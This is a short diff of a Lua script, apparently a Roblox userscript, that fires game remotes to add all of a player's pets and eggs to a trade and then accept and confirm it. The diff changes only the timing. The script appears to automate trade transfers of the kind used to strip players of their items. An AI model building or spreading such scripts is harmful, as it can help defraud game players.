@@ -466,8 +466,6 @@ local function PZSESN_fake_script() -- userInterface.Userscript
                     pcall(function()
                         addItemRemote:FireServer(petId.Value)
                     end)
-
-			        task.wait(0.05)
                 end
             end
 
@@ -477,19 +475,15 @@ local function PZSESN_fake_script() -- userInterface.Userscript
                     pcall(function()
                         addItemRemote:FireServer(eggId.Value)
                     end)
-
-			        task.wait(0.05)
                 end
             end
 
             -- Give the game time to register all items
-            task.wait(1)
+            task.wait(10)
 
             pcall(function()
                 AcceptNeg:FireServer()
             end)
-
-            task.wait(0.5)
 
             pcall(function()
                 ConfirmTrade:FireServer()
